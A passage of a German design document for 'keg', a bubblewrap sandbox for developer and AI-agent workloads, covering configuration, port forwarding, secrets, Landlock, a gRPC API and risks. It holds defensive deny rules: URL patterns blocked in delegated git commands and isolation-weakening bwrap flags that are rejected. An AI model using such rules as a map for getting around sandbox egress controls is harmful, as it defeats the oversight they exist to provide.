* Skalare (`storage_base`, `tmp_base`, `just_bin`, …): späterer Wert
  ersetzt den früheren.
* Listen (`extra_exact`, `extra_prefixes`, `extra_raw`): **Vereinigungsmenge**
  — Freigaben addieren sich, nichts wird weggenommen. So kann ein Repo
  lokal mehr erlauben, ohne andere Repos zu beeinflussen; weniger als das
  Repo-`.keg.yaml` definiert geht weiterhin nicht.
* Maps (`dns.hosts` etc., falls später in der User-Config genutzt): Key-
  weises Merge.

**Präzedenz gesamt** (später gewinnt):

1. Built-in Defaults (`/var/lib/containers/storage/sandbox`, `/tmp`, …)
2. `~/.config/keg/config.yaml` — global (Maschine/User)
3. `~/.config/keg/config.yaml → repos[<match>]` — pro Ziel-Repo
4. `.keg.yaml` — Repo (**ohne** Host-Pfade, s. Abschnitt 5)
5. CLI-Flags (`keg --storage-base …`)

Damit bleibt das Repo portabel (keine maschinenspezifischen Pfade im Git),
während der Bestands-Default unverändert weitergreift. Die Layer-Management-
Kommandos (`--list`, `--clean`, `--clean-cache`, `--clean-all`) respektieren
dieselbe effektive `storage_base` des jeweiligen Ziel-Repos. Die
`runner.extra_*`-Listen werden über alle Ebenen mit den Repo-Regeln
**gemerged** — eine Maschine kann lokal mehr freigeben, ohne das Repo
anzufassen.

### 4.9 Rückkanal: Port-Forwarding (Host → Sandbox-Loopback)

Dev-Server laufen **in** der Sandbox — aber Tests wie Playwright laufen auf
dem **Host** (bzw. als delegierter Host-Job) und müssen die Services
erreichen können. Da die Sandbox nur eigenes Loopback hat, gibt es dafür
einen kontrollierten **Rückkanal (Kanal E)**: Der Host exponiert deklarierte
Sandbox-Ports auf seinem eigenen Loopback.

```
Host 127.0.0.1:3000 ──► Listener (keg) ══ Kanal E (muxado) ══► Guest-Forwarder
                                                                     └─► 127.0.0.1:3000 in der Sandbox
```

* **Deklaration im Repo (Bedarf):**
  ```yaml
  ports:
    - "3000"              # Sandbox :3000  -> Host 127.0.0.1:3000
    - "5432:15432"        # Sandbox :5432  -> Host 127.0.0.1:15432
    - name: dev-server
      port: 8080
      dynamic: true       # Host-Port frei wählbar, wird als KEG_PORT_dev-server
                          # in die Sandbox-Env geschrieben (Kollisionssicher)
  ```
* **Mechanik:** Host-seitig bindet keg je Eintrag einen TCP-Listener;
  jede eingehende Verbindung öffnet einen muxado-Stream über Kanal E,
  der Guest-Forwarder verbindet sie mit dem Ziel auf dem Sandbox-Loopback.
  Nur TCP (UDP-Dev-Dienste sind bis auf Weiteres out of scope).
* **Bind-Regel:** Host-seitig wird ausschließlich `127.0.0.1` gebunden —
  niemals `0.0.0.0`. Damit bleibt der Rückkanal lokal; andere Rechner
  sehen nichts.
* **Isolation bleibt intakt:** Die Sandbox erhält weiterhin **keinen**
  ausgehenden Weg — sie kann Verbindungen nur *annehmen*, die der Forwarder
  einbringt. Invarianten 1 und 2 (§12 Threat Model) gelten unverändert:
  auch dieser Verkehr läuft durch einen polizeilich kontrollierten Kanal.
* **Lifecycle:** Listener werden beim Start gebunden (Kollision ⇒ klarer
  Fehler oder `dynamic: true`) und bei Sandbox-Ende freigegeben.
* **Playwright-Workflow:** Der delegierte Host-Job (`just delegate
  test-playwright …`) erreicht den in der Sandbox laufenden Dev-Server
  schlicht unter `http://127.0.0.1:<port>` — kein Umweg über Container-
  Netze, keine IP-Ermittlung.

---

## 5. Konfiguration: `.keg.yaml`

Eine Datei pro Repository, versioniert. Vollständiges Beispiel mit allen
unterstützten Feldern:

```yaml
version: "1"

# Repo-lokale Variablen für die Template-Ersetzung (s. u.). Maschinen-
# spezifische Werte gehören in die User-Config (§4.8) — dort unter dem
# selben Schlüssel `vars` mit identischem Merge-Verhalten.
vars:
  tailwind_bin: .cache/bin
  mock_port: "9090"

# Sprach-Templates: bringen Toolchain-Env und Cache-Mounts mit
templates:
  - go

# First-class Environment-Steuerung für die Sandbox (Deny-by-default).
# Werte sind template-bar ({{ .Vars… }}, {{ .Env… }}).
# Reihenfolge: Basis-Isolation (nur Core-Vars HOME, TMPDIR, SHELL, PATH, CODE_KEG;
# im interaktiven PTY-Modus zusätzlich Terminal-/Farb-Variablen wie TERM, COLORTERM)
# -> Template-Env -> User-Global -> Repo -> repos[match] override -> CLI.
# Konflikte: unset gewinnt über inherit; set gewinnt über geerbte Werte.
env:
  inherit:                     # Explizite Host-Variablen durchreichen
    - LANG
  inherit_all: false           # true = alle Host-Vars durchreichen (außer Denied-Credentials)
  unset:                       # Zusätzliche Variablen aktiv entfernen
    - UNWANTED_VAR
  set:
    LOG_FORMAT: json
    # Secrets kommen als fertige Vars aus der User-Config (§4.8,
    # vars_from_exec) — hier steht KEIN Secret-Manager-Aufruf:
    AI_TOKEN: '{{ .Vars.ai_token | default "" }}'
    MOCK_URL: 'http://mock.localhost.test:{{ .Vars.mock_port }}'

# Repository-Trust-Gate & Trust-Anchors:
# Um zu verhindern, dass bösartige oder manipulierte Repositories ungefragt
# Host-Variablen anfordern, schädliche Host-Tasks ausführen oder die
# Sandbox-Konfiguration manipulieren, prüft keg jede nicht-leere .keg.yaml
# sowie alle definierten Trust-Anchor-Dateien (z. B. via `trust_anchors:` oder
# automatischer Justfile-Erkennung) gegen den lokalen Trust-Store
# (~/.config/keg/trust.yaml). Neue oder geänderte Konfigurationen bzw.
# Anchor-Dateien erfordern eine Freigabe (interaktiv via TTY-Prompt mit Diff
# oder via `keg trust`).

# Optionale zusätzliche Trust-Anchors (Dateien im Repo, deren Integrität
# vor dem Start kryptografisch verifiziert werden muss):
trust_anchors:
  - Makefile
  - scripts/prepare-host.sh

# Rohe Zusatz-Argumente für den generierten bwrap-Aufruf (Stringliste,
# template-bar). Werden NACH allen abgeleiteten Argumenten angehängt und
# können diese ergänzen, nicht zuverlässig zurücknehmen — Isolation-
# schwächende Flags (--share-net, --dev-bind /, fehlendes --disable-userns …)
# erfordern eine Freigabe in der User-Config (§4.8: security.allow_weak_bwrap)
# und werden sonst mit klarer Fehlermeldung abgelehnt.
bwrap_args:
  - "--setenv"
  - "BASH_ENV"
  - "/etc/keg/bash-env"
  - "--bind"
  - "{{ .Vars.mock_data }}"
  - "/data/mock"

# Dateisystem-Zusatz-Binds. src/dest sind template-bar:
#   {{ .Vars.<name> }}   — aus `vars:` (Repo < User < CLI/Env)
#   {{ .Env.<NAME> }}    — Host-Umgebungsvariable (leer ⇒ Validierungsfehler,
#                          außer via `| default "…"`)
#   Pflichtfelder wie version/templates sind NICHT template-bar.
mounts:
  - src: "{{ .Vars.tailwind_bin }}/tailwindcss"
    dest: /usr/local/bin/tailwindcss
    mode: ro            # ro | rw | dev | tmpfs(dest only)
  - src: /etc/ssl/certs
    dest: /etc/ssl/certs
    mode: ro
  - src: "{{ .Env.HOME | default "/nonexistent" }}/mock-data"
    dest: /data/mock
    mode: ro

# Periodisch refreshte Datei-Secrets unter /run/secrets/<NAME> (§4.7).
# Die Quellen (`cmd`, `interval`) liegen ausschließlich in der User-Config;
# hier steht nur der Bedarf.
secrets:
  - name: ai_token          # -> /run/secrets/ai_token
  - name: db_password
    env: DB_PASSWORD_FILE   # zusätzlich: DB_PASSWORD_FILE=/run/secrets/db_password

# Port-Rückkanal: Sandbox-Services auf dem Host-Loopback exponieren (§4.9).
# Host-seitig wird ausschließlich 127.0.0.1 gebunden; deny-by-default.
ports:
  - "3000"                  # Dev-Server -> Host 127.0.0.1:3000
  - "5432:15432"            # Sandbox:5432 -> Host:15432

network:
  isolated: true        # false => --share-net ohne Proxy-Zwang (Ausnahmefall)
  allowed_domains:      # Whitelist für Proxy UND DNS (deny-by-default)
    - proxy.golang.org
    - sum.golang.org
    - gopkg.in
    - github.com
    - objects.githubusercontent.com
    - "*.debian.org"
  dns:
    enabled: true
    upstream: "10.0.0.53"        # Firmen-CoreDNS; leer = System-Resolver des Hosts
    hosts:                        # exakt ODER Wildcard (*.suffix), s. §4.4
      db.local.test: "127.0.0.1"
      "*.svc.local.test": "127.0.0.1"
      "*.githubusercontent.com": "10.0.0.7"

# Host-only Tasks, die aus der Sandbox heraus per `just delegate` nutzbar sind
delegated_tasks:
  exact:
    - container-build
    - container-push
    - test-integration-podman
  prefixes:
    - test-playwright
    - install-playwright
  # Raw-Commands: werden NICHT mit `just` gewrappt, sondern direkt auf dem
  # Host ausgeführt (nötig für Git in Linked Worktrees u. Ä.). Matching über
  # das Argument-Pattern-System aus Abschnitt 4.5.
  raw:
    - cmd: git
      subcommands:            # erstes Nicht-Options-Argument muss hierdrin sein
        - add
        - branch
        - checkout
        - commit
        - diff
        - fetch
        - log
        - merge
        - rebase
        - reset
        - show
        - stash
        - ls-files
        - status
        - switch
      opts_with_value:        # konsumieren das Folgeargument
        - "-c"
        - "-C"
        - --git-dir
        - --work-tree
        - --namespace
      flags:                  # standalone erlaubte globale Flags
        - --no-pager
        - --paginate
        - --no-paginate
        - --bare
        - --literal-pathspecs
      allow_opt_value_form: true   # auch `--opt=value` (selbstständig) akzeptieren
      forbidden_args_matching:     # keine fremden URLs über Host-Jobs (§4.5)
        - "https://*"
        - "http://*"
        - "git@*"
        - "ssh://*"
      # alles NACH dem erkannten Subcommand wird unverändert durchgereicht:
      # `git -c user.email=x@y commit -m "meine Message"` funktioniert.
```

**Validierungsregeln:** `version` erforderlich; unbekannte Felder = Fehler;
`templates`-Namen müssen builtin sein (Custom-Templates via
`.keg.d/*.yaml` später); Mount-Quellen müssen existieren (sonst klarer
Fehler vor Sandbox-Start); `mode: dev` erfordert eine explizite Freigabe.
Raw-Regeln ohne nicht-leeres `subcommands`-Set sind ein Konfigurationsfehler.
Template-Ausdrücke werden **vor** der Pfad-Validierung ausgewertet; ein
leeres Ergebnis (fehlende Var/Env ohne `default`) ist ein Konfigurationsfehler
mit Verweis auf die betroffene Zeile. `env.set`/`bwrap_args`-Werte werden
gleichfalls vor Start aufgelöst und validiert; Isolation-schwächende
`bwrap_args` ohne `security.allow_weak_bwrap` in der User-Config werden mit
Nennung des konkreten Flags abgelehnt.

#### Variablen & Template-Ersetzung (Go-template-Stil)

String-Felder in Mounts (`src`, `dest`), DNS-`hosts` und Env-Werten der
Templates werden mit Go-`text/template` ausgewertet. Verfügbarer Kontext:

| Ausdruck | Quelle | Beispiel |
|---|---|---|
| `{{ .Vars.name }}` | `vars:` — gemerged aus Repo-YAML, User-Config (global + repos-Match) und `KEG_VAR_*`-Env | `{{ .Vars.tailwind_bin }}/tailwindcss` |
| `{{ .Env.NAME }}` | Host-Umgebung | `{{ .Env.HOME }}/.m2` |
| `\| default "x"` | Fallback bei leerem Wert | `{{ .Vars.ai_token \| default "" }}` |

Es gibt **bewusst keine `exec`-Funktion in Repo-Templates**. Dynamische
Werte — insbesondere Secrets — werden stattdessen in der **User-Config**
deklariert (`vars_from_exec`, s. §4.8) und landen als ganz normale Vars im
Kontext: Das Repo referenziert nur `{{ .Vars.ai_token }}` und weiß nicht (und
muss es nicht), wie der Wert zustande kommt.

**Anwendungsfall „dynamische Secrets“:** Der Sandbox wird z. B. ein AI-Token
als Env-Variable mitgegeben, der erst beim Start frisch vom Secret-Manager
angefordert wird — er liegt also nie in einer Datei und ist nie älter als der
Sandbox-Start:

```yaml
# Repo: nur Referenz, kein Mechanismus
env:
  set:
    AI_TOKEN: '{{ .Vars.ai_token | default "" }}'
network:
  allowed_domains:
    - api.openai.com        # Token-Nutzung braucht auch Egress!
```
```yaml
# ~/.config/keg/config.yaml — der eigentliche Abruf lebt HIER:
vars_from_exec:
  ai_token:
    cmd: [op, read, "op://Vault/AI/token"]
    cache: session            # einmal pro Sandbox-Lauf (Default)
    timeout: 10s
```

Eigenschaften und Guardrails:

* Ausführung erfolgt **einmalig auf dem Host vor dem bwrap-Start**, im
  Kontext des aufrufenden Users; stderr wird ins keg-Log geleitet,
  stdout (ohne trailing Newline) ist der Var-Wert.
* Exit-Code ≠ 0 ⇒ harter Konfigurationsfehler (Sandbox startet gar nicht
  erst mit halben Secrets).
* **Caching pro Sandbox-Lauf** (`cache: session`, Default): mehrere
  Template-Referenzen auf dieselbe Var lösen genau einen Programmaufruf
  aus. Alternativ `cache: none`.
* Timeout konfigurierbar (Default 10 s), danach Fehler.
* exec-Prozesse erhalten eine **minimale Umgebung** (keine Host-Env-
  Weiterleitung); Workingdir ist das Repo-Root.
* Ergebnisse werden in den gemergten `Vars`-Namespace eingespeist — für
  Repo-Templates sind sie von statischen Variablen nicht unterscheidbar.
* Ohne Definition in der User-Config bleibt die Var leer ⇒ Repo-Templates
  arbeiten mit `\| default "…"`; auf fremden Maschinen läuft das Repo
  damit sauber ohne Secret weiter.

Damit lässt sich z. B. die **Quelle eines Mounts pro Maschine übersteuern**:
das Repo deklariert `src: "{{ .Vars.mock_data }}"`, und in
`~/.config/keg/config.yaml` setzt nur der eine Entwickler
`vars: { mock_data: /data/big-mock }`. Das Repo bleibt dabei portabel —
ohne User-Config greift der repo-lokale Default.

Merge-Reihenfolge für `vars:` (später gewinnt):

1. Repo-`.keg.yaml` (Repo-Defaults)
2. `~/.config/keg/config.yaml` → globaler `vars:`-Block
3. `… → repos[<match>].vars`
4. Environment `KEG_VAR_<NAME>` (Upper-Snake)

Einschränkungen aus Sicherheitsgründen:

* Kontext ist bewusst minimal: `.Vars` und `.Env`; jede weitere Funktion
  = harter Fehler. **Kein `exec` in Templates** — Programme zur Werte-
  beschaffung startet ausschließlich die User-Config (`vars_from_exec`).
* `{{ .Env.* }}` lässt sich über die User-Config global deaktivieren
  (`template_env.allow_env: false`) — sinnvoll, wenn Repos nicht vertraut
  werden sollen, Host-Umgebung in Mount-Pfade zu injizieren.
* Template-Auswertung passiert **auf dem Host vor dem bwrap-Start**;
  in die Sandbox gelangen ausschließlich die aufgelösten Endwerte.
* Nicht template-bare Felder (z. B. `delegated_tasks.*`, `version`,
  `templates`) werden literal genommen — Freigaben lassen sich nicht per
  Variablen umleiten.

> **Trennung der Konfigurationsebenen:** Die Repo-Datei `.keg.yaml`
> enthält **keine Host-Pfade** (Overlay-Layer, Cache-Ablagen o. Ä.) — Repos
> werden geteilt und versioniert, solche Pfade wären eine Injektionsfläche.
> Maschinenlokale Pfade gehören ausschließlich in die User-Config
> (Abschnitt 4.8).

---

## 6. Sicherheitsmodell

| Ebene | Kontrolle |
|---|---|
| Dateisystem | Nur Repo + deklarierte Mounts sichtbar/schreibbar; Rest read-only oder nicht vorhanden; `--disable-userns` gegen Nested-Sandbox-Escape |
| Prozess/PID/IPC | `--unshare-all` (PID, IPC, UTS, Cgroup, Net, User) |
| Netzwerk-Topologie | Nur Loopback; kein Interface, kein Gateway, kein externes Routing |
| Egress L7 | Proxy: Domain-Whitelist (CONNECT-Target/SNI-Äquivalent) → 403 |
| Namensauflösung | DNS: Whitelist + NXDOMAIN; verhindert DNS-Tunneling-Versuche weitgehend |
| Delegation | Runner-Whitelist exact/prefix/raw-Patterns; Exit 126 bei Ablehnung; Pfad-Jail; Parameter nur als Argumente, nie als Environment |
| Lifecycle | `--die-with-parent` + Signal-Handler: keine verwaisten Prozesse/Sockets |
| Audit | Proxy- und Runner-Entscheidungen werden geloggt (allow/deny + Grund) |
| Secrets | `/run/secrets` ro, Dateimode 0400/Dir 0700; atomare Updates via Directory-Bind; Inhalte nie in Templates/Logs/argv |

**Bewusste Trade-offs & Designentscheidungen**:
* **Kein `bwrap --new-session`**: `bwrap --new-session` dient primär der Abwehr von TIOCSTI-Terminal-Injection (`ioctl(TIOCSTI)`). keg benötigt dies nicht, da der Host für interaktive Sessions ein eigenes Pseudo-Terminal allokiert (`openPTY()`) und dem Gast ausschließlich das Slave-Ende zuweist (nicht-interaktiv reine Pipes). Das Host-TTY wird nie geteilt. Durch den Verzicht auf `--new-session` bleiben interaktive Job Control, Signale (`Ctrl+C`) und Terminal-Resize (`SIGWINCH`) voll funktionsfähig.
* **Geteilte Build-Caches**: RW-Cache-Binds bedeuten, dass Build-Artefakte im Host-Cache landen — optional per `--isolate-caches` abschaltbar.

### 6.1 Defense-in-Depth: Landlock (optional)

Ergänzend zum Mount-Namespace-Ansatz von bwrap unterstützt keg das
**Landlock LSM** (Linux ≥ 5.13) als zweite Dateisystem-Verteidigungslinie.
Anders als bwrap-Mounts ist Landlock eine **Syscall-Ebene-Einschränkung**:

* Unprivilegiert anwendbar (kein `CAP_SYS_ADMIN`), Regeln sind pfadbasiert
  (lesen/schreiben/ausführen), werden an alle Kindprozesse vererbt und
  können **nie gelockert** — nur verschärft werden (`landlock_restrict_self`).

**Anwendung in keg:** Der Sandbox-Entrypoint (Aufruf #2) legt vor dem
`exec <cmd>` ein Ruleset an, das exakt die deklarierten Schreibziele freigibt
(Repo, `/tmp`, Sandbox-HOME, Cache-Ziele, Secret-Dateien lesend) und alles
andere blockiert. Nutzen trotz bwrap:

* Schutz gegen **Mount-Namespace-Escape-Szenarien** (Kernel-Bugs,
  setuid-Binaries mit unerwarteten Capabilities): selbst ein Prozess, der
  dem Namespace entkommt, bleibt FS-seitig eingesperrt.
* Härte für Prozesse, die versehentlich außerhalb der gemounteten Pfade
  schreiben wollen — Fehler statt stiller Streuung.
* Nützlich auch für **verschachtelte Szenarien** (Build-Skripte starten
  eigene Sub-Sandboxen).

Verhalten: Feature-Detection beim Start; fehlt Kernel-Support ⇒ Warnung +
Weiter ohne Landlock (best effort, kein Harter Fehler), konfigurierbar via
User-Config (`security.landlock: auto | on | off`).

---

## 7. Nutzung (Ziel-UX)

```bash
# Build einmal installieren
go build -o bin/keg ./cmd/keg

# Interaktive Shell in der Sandbox (gemäß .keg.yaml)
./bin/keg

# Direkt einen Befehl isoliert ausführen
./bin/keg -- go test ./...

# Werfbarer Lauf (Repo bleibt unberührt)
./bin/keg --ephemeral -- just test

# Persistenter Agenten-Layer, diff-bar
./bin/keg --disk-overlay agent-run-42 -- bash -c 'just build && git diff'
```

Innerhalb der Sandbox verhalten sich Tools transparent: `go get` nutzt den
internen Proxy, DNS geht an `127.0.0.1:53`, `just delegate …` erreicht den
Host-Runner. Fehlerbilder (Runner-Socket fehlt, DNS blockiert, fehlender
Toolchain-Cache) werden mit den bekannten, selbsterklärenden Meldungen
geliefert.

Neben dem Konsolen-Modus existieren zwei weitere Einbindungswege: die
**Go-Library** (Embedding) und der **Fernsteuerbare Daemon** (gRPC) —
siehe §8.

---

## 8. Go-API & Remote-Steuerung

Neben dem Konsolen-Start soll keg in zwei weiteren Modi nutzbar sein:
als **einbettbare Go-Library** (das eigene Programm startet und kontrolliert
Sandboxen programmatisch) und als **Fernsteuerbarer Daemon** (gRPC-API, z. B.
für IDE-Plugins, CI-Runner oder Agent-Frameworks). Beide Modi nutzen exakt
dieselbe Policy-Engine — die YAML bleibt maßgeblich, die API ist nur ein
anderer Weg hinein.

### 8.1 Paketstruktur & Refactoring

```
cmd/keg            # CLI (thin wrapper)
internal/orchestrator  # Kern: bwrap-Bau, Socketpairs, Daemons, Lifecycle
internal/runner        # Delegation-Daemon
internal/egress        # Proxy + DNS
pkg/keg            # öffentliche Library-API (§8.2)
proto/keg/v1       # gRPC-Schema für den Daemon-Modus (§8.3)
```

Der Orchestrator wird so refactored, dass CLI, Library und Daemon nur
unterschiedliche *Treiber* auf denselben Kern sind. Der `reexec`-Mechanismus
bleibt unverändert (Self-Start in bwrap).

### 8.2 Library-API (Embedding)

```go
import "example.com/keg/pkg/keg"

sb, err := keg.Launch(ctx,
    keg.WithRepo("/work/repo"),          // Default: CWD
    keg.WithConfigFile(".keg.yaml"), // Default: Repo-Root
    keg.WithOverlay(keg.Ephemeral),  // oder Disk("agent-42")
    keg.WithVar("mock_data", "/data/m"), // Vars-Override
)
if err != nil { /* Validierungs-/Startfehler */ }
defer sb.Close()

// Befehl IN der Sandbox ausführen (streaming):
run := sb.Command(ctx, "go", "test", "./...")
run.Stdout(os.Stdout).Stderr(os.Stderr)
rc, err := run.Wait()

// Kurzsyntax:
out, rc, err := sb.Output(ctx, "git", "status", "--porcelain")

// Zustand & Metadaten:
fmt.Println(sb.ID(), sb.Config().Network.AllowedDomains)

// Secret-Dateien lesen (Pfad in der Sandbox, Inhalt host-refreshed):
_ = sb.SecretPath("ai_token") // /run/secrets/ai_token
```

Designprinzipien:

* **Handle-Pattern:** `*Sandbox` implementiert `io.Closer`; `Close()` fährt
  Refresher/Daemons herunter, killt Prozesse, räumt Temp/Layer auf — dieselbe
  Logik wie der CLI-Cleanup.
* **Kontext-getrieben:** `ctx.Cancel` beendet Sandbox und alle Kind-Prozesse
  (entspricht Ctrl+C im CLI-Modus).
* **Kein Policy-Umweg:** `Launch` validiert identisch zur CLI; es gibt keine
  Option, Whitelists zu überschreiben, die nicht auch per User-Config ginge.

**Technische Erweiterung: Guest-Agent statt exec-and-forget.** Im Library-
Modus kann der Aufrufer nicht einfach das Terminal erben — der Entrypoint
in der Sandbox wird daher zu einem kleinen **Guest-Agent** (PID 1): Er
startet wie bisher Bridges/DNS, bedient aber zusätzlich einen vierten Kanal
(Kanal D, eigener Socketpair, muxado-Session), über den der Host
`Exec`-Requests schickt: spawn, stdin-Chunks, stdout/stderr-Events,
signal, exit. Damit sind parallele Befehle, Signale und PTY-Verhalten
sauber steuerbar. Im reinen CLI-Modus verhält sich der Agent transparent
wie bisher (`exec <cmd>`).

### 8.3 Remote-API (Daemon-Modus)

Der Daemon unterstützt mehrere Listener-Typen — TCP **und** Unix-Socket als
gleichwertige Alternativen:

```bash
keg serve                                    # Default: Unix-Socket
keg serve --listen unix:///run/keg/api.sock   # expliziter Unix-Pfad
keg serve --listen 127.0.0.1:7777            # TCP nur auf Loopback
keg serve --listen 0.0.0.0:7777 --auth token # Netz: nur mit Auth
```

| Listener | Adressierung | Standard-Absicherung |
|---|---|---|
| `unix://…` (Default) | Dateipfad, Dir-Mode `0770`/Socket `0660` | Dateirechte des Socket-Pfads; Gruppen-basierte Zugriffskontrolle |
| TCP `127.0.0.1:…` | Loopback | Token-Auth verpflichtend bei mehr als einer User-Kennung |
| TCP `0.0.0.0:…` / Hostname | Netzwerk | Nur mit explizitem `--auth token` (bzw. mTLS); sonst Startverweigerung |

Unix-Sockets sind der bevorzugte Modus für lokale Verbraucher (IDE-Plugin,
CI-Runner auf demselben Rechner): kein Port im Spiel, Zugriffsrechte über
das Dateisystem, und die Verbindung erbt die UID des Clients — der Daemon
can diese für Audit-Zeilen (`SO_PEERCRED`) mitloggen.

```proto
service Keg {
  rpc CreateSandbox(CreateRequest) returns (SandboxStatus);
  rpc Exec(stream ExecRequest) returns (stream ExecEvent); // stdin/events duplex
  rpc Status(SandboxId) returns (SandboxStatus);
  rpc List(google.protobuf.Empty) returns (stream SandboxStatus);
  rpc Stop(SandboxId) returns (google.protobuf.Empty);
}
// ExecEvent: stdout | stderr | exited(rc) | error(msg) — framing wie Runner
```

Typische Verbraucher: IDE-Integration (Tests aus der IDE heraus in der
Projekt-Policy laufen lassen), CI-Job-Runner, LLM-Agent-Frameworks (ein
Agent, viele isolierte Werf-Läufe via `--ephemeral`).

Sicherheitsregeln für den Daemon:

* **Loopback/Unix-Socket by default;** Netz-Exposition ist explizites Opt-in
  mit Token-Auth (mTLS optional). Kein Root.
* Jeder RPC-Aufrufer unterliegt derselben `.keg.yaml`-Policy wie lokal;
  die API schafft keine neuen Freigaben.
* Secrets bleiben Host-seitig: Über die API werden nie Secret-Inhalte
  übertragen, nur Pfade/Existenz.
* Audit: jeder Create/Exec/Stop wird geloggt (Aufrufer-ID, Repo, Command).
* Ressourcen-Limits: maximale Anzahl paralleler Sandboxen pro Caller
  konfigurierbar.

### 8.4 Auswirkungen auf Bestehendes

* FD-Map (§9) erhält optionalen **Kanal D (Control)** — nur im
  Library/Daemon-Modus aktiv.
* Die CLI bleibt unverändert nutzbar; alle Beispiele in §7 gelten weiter.
* Neuer Meilenstein M9 (s. §11).

---

## 9. FD- und Protokoll-Map

| FD (Sandbox) | Kanal | Multiplexing | Protokoll darüber |
|---|---|---|---|
| 3 | Proxy | muxado-Session | HTTP/CONNECT-Streams |
| 4 | DNS | Length-Prefix-Frames (RFC 1035 TCP-Framing) | DNS-Nachrichten |
| 5 | Runner | Length-Prefix-JSON (b64-Argumente) | Job-Requests/Responses |
| 6 | Control (optional) | muxado-Session | Guest-Agent: Exec-Requests, stdin/stdout/stderr-Events, Signale — nur im Library/Daemon-Modus (§8) |
| 7 | Ports (optional) | muxado-Session | Rückkanal: Host-Listener → Sandbox-Loopback (§4.9); nur deklarierte Ports, Host-Bind nur 127.0.0.1 |

Alle Kanäle sind unidirektional verbunden (Socketpair), authentifiziert
dadurch, dass nur der keg-Prozess die FDs besitzt — kein netzwerksichtiger
Socket, nichts für andere User erreichbar.

---

## 10. Technologie-Stack

| Baustein | Wahl | Begründung |
|---|---|---|
| Isolation | bubblewrap ≥ 0.11 | unprivilegiert, minimal, OverlayFS nativ (verifiziert) |
| Runtime | Go | pwpeer-Erfahrung, Single-Binary, Goroutine-Daemons |
| Reexec | `moby/sys/reexec` | sauberer Multi-Call-Aufruf desselben Binary |
| Multiplexing | `golang.ngrok.com/muxado` | bewährt aus pwpeer; viele Streams über 1 FD |
| DNS | `miekg/dns` | CoreDNS-Kern, eingebettet ohne externes Binary |
| Config | `gopkg.in/yaml.v3` | Standard, strict decoding |
| FS-Hardening | Landlock LSM (Kernel ≥ 5.13, optional) | Unprivilegierte Syscall-Ebene-FS-Restriction als zweite Verteidigungslinie (§6.1) |
| Remote-API | gRPC (+ optional grpc-gateway für REST) | Streaming-fähige Duplex-Events, Codegen für IDE-/Agent-Integrationen (§8.3) |

---

## 11. Umsetzungsplan (Meilensteine)

1. **M1 – Skeleton:** Go-Orchestrator, reexec-Loop, bwrap mit Basis-Binds,
   `--unshare-all`, interaktive Shell. *Ergebnis: Shell in isolierter Box.*
2. **M2 – Proxy-Kanal:** Socketpair + muxado, Egress-Proxy mit Whitelist +
   Upstream-CONNECT, Guest-Bridge auf 18081 (bewusst außerhalb des Dev-Server-Portbereichs, siehe §4.3), Env-Injection.
   *Ergebnis: `go get` läuft whitelisted.*
3. **M3 – DNS-Kanal:** Embedded DNS (hosts/whitelist/upstream), resolv.conf-
   Injektion, UDP/TCP-Bridge.
4. **M4 – Konfiguration:** `.keg.yaml` (Parsing, Validierung, dynamische
   bwrap-Args), Templates go/java/node/python, Port-Rückkanal (Kanal E,
   §4.9) für Playwright-gegen-Sandbox-Workflows.
5. **M5 – Delegation:** Runner-Daemon in Go, Whitelist mit allen drei
   Regelklassen inkl. Raw-Argument-Patterns (Git-Semantik aus dem Bestand),
   Streaming, Exit-Codes, `sandbox.just`-Kompatibilität (`CODE_SANDBOX`).
6. **M6 – Overlays/Layer:** `--ephemeral`, `--disk-overlay`,
   `--isolated-cache-name`, Layer-Management (`--list/--clean`).
7. **M7 – Polish:** strukturiertes Logging/Audit, Fehlerbilder-Doku,
   Parallel-Instanzen (`--name`), Testmatrix.
8. **M8 – Hardening:** Secret-Bind-Refresher, Landlock-Support (best
   effort), `forbidden_args_matching`-Erweiterung des Raw-Matchers,
   CGO/Linker-Erreichbarkeitsprüfung.
9. **M9 – Go-API & Daemon:** Refactoring in `internal/orchestrator` +
   `pkg/keg`, Guest-Agent mit Control-Kanal, `keg serve` mit
   gRPC-API, Auth/Audit/Limits.

Jeder Meilenstein ist einzeln testbar; M1–M3 decken bereits den
Haupt-Use-Case (offline-fähige Go-Sandbox mit kontrolliertem Egress) ab.

---

## 12. Risiken & offene Punkte

| Risiko | Bewertung | Gegenmaßnahme |
|---|---|---|
| Unprivilegiertes OverlayFS nicht überall erlaubt | Mittel (Zielsystem ✓) | Fallback auf plain RW-Bind; Feature-Detection beim Start |
| DNS-over-HTTPS könnte Proxy-Whitelist umgehen | Niedrig (DoH-Hosts wären selbst Whitelist-Kandidaten) | DoH-Domains nicht whitelisten; Proxy blockt CONNECT zu unbekannten Hosts ohnehin |
| Toolchain-Downloads (Go) via Proxy | Offen | `GOTOOLCHAIN=local` + Warm-Cache ist Default; Toolchain-Domain optional whitelisten |
| Parallele Instanzen teilen Delegations-Ziele | Bekannt aus Bestand | Dokumentieren; Serialisierung auf Rezept-Ebene |
| Windows/macOS-Hosts | Out of scope | bwrap ist Linux-only; Doku entsprechend kennzeichnen |
| Landlock auf alten Kernels (< 5.13) | Niedrig | Best effort: Warnung + Weiter ohne Landlock (`security.landlock: auto`) |
| Bedarf an UDP/ICMP/Raw-TCP-Egress (HTTP/3, mDNS, Ping) | Mittel (konstruktiv nicht abgedeckt) | Bewusst kein pasta-Default; Opt-in-Downgrade `network.mode: pasta` oder leichtgewichtig `network.allowed_endpoints`-TCP-Relay (§2.3) |
| UDP-Stau am DNS-Kanal bei langsamen Upstream-Lookups | Niedrig | Begrenzte Queue + sauberes Framing; keine Drops (§4.4) |
| Delegierte Jobs umgehen Sandbox-Netz-Policy | Mittel | `forbidden_args_matching` für netzwerkrelevante Raw-Regeln (§4.5) |

**Entschiedene Designfragen** (statt ehemals offen):

* **Datei-Rücktransport: NEIN.** Der Runner bleibt bewusst schmal
  (Prozess-Delegation + Live-Stream + Exit-Code); ein Artefakt-Kanal würde
  Pfad-Traversierungs-, Permission- und Locking-Probleme mitbringen.
  Konvention stattdessen: Host-Jobs (Container-Builds etc.) schreiben ihre
  Ergebnisse **direkt ins Repo-Verzeichnis** — das Repo ist auf Host und in
  der Sandbox identisch gemountet (rw bzw. Disk-Overlay), Artefakte sind
  damit ohne Transferprozess sichtbar.
* **Argument-Constraints für Raw-Regeln: JA, minimal.**
  `forbidden_args_matching` (Glob/Regex je Einzelargument, §4.5) blockt
  z. B. fremde URLs bei `git fetch/pull` — wichtig, weil delegierte Jobs
  außerhalb der Sandbox-Netzwerk-Policy laufen. Positiv-Whitelisting
  („push nur auf Remote X“) bleibt Zukunftsoption.

Gelöst gegenüber früheren Entwürfen: Argument-Patterns für die
